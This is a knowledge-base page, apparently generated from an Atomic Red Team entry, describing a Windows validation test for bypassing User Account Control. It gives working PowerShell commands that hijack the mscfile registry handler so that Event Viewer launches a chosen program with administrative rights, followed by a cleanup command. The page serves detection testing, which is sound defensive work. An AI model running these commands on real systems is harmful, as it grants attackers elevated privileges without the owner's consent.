---
atomic_guid: "a6ce9acf-842a-4af6-8f79-539be7608e2b"
title: "Bypass UAC using Event Viewer (PowerShell)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1548.002"
attack_technique_name: "Abuse Elevation Control Mechanism: Bypass User Account Control"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "a6ce9acf-842a-4af6-8f79-539be7608e2b"
  - "Bypass UAC using Event Viewer (PowerShell)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Bypass UAC using Event Viewer (PowerShell)

PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privalages

## Metadata

- Atomic GUID: a6ce9acf-842a-4af6-8f79-539be7608e2b
- Technique: T1548.002: Abuse Elevation Control Mechanism: Bypass User Account Control
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1548.002/T1548.002.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1548-abuse_elevation_control_mechanism|T1548.002]]

## Input Arguments

### executable_binary

- description: Binary to execute with UAC Bypass
- type: path
- default: C:\Windows\System32\cmd.exe

## Executor

- name: powershell

### Command

```powershell
New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"
```

### Cleanup

```powershell
Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.yaml)
